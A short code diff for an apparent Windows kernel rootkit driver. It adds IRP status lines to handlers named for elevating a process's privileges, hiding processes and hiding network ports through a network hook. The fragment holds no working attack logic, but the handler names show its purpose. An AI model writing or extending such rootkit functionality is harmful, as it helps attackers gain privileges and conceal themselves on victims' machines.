@@ -29,7 +29,8 @@ NTSTATUS IoctlHandlers::HandleElevate(PIRP Irp) {
 	status = ElevateByPid(pid);
 
 	Irp->IoStatus.Information = 0;
-
+	Irp->IoStatus.Status = status;
+	
 	return status;
 
 }
@@ -54,6 +55,7 @@ NTSTATUS IoctlHandlers::HandleHideProcess(PIRP Irp) {
 
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
+	
 	return status;
 }
 
@@ -70,7 +72,9 @@ NTSTATUS  IoctlHandlers::HandleHidePort(PIRP Irp) {
 
 	//add the desired port to the vector of hidden ports
 	NetHook::hidden_ports->push_back(NetHook::htons(static_cast<USHORT>(port)));
-
+	
+	Irp->IoStatus.Status = status;
+	Irp->IoStatus.Information = 0;
 	return status;
 }
 
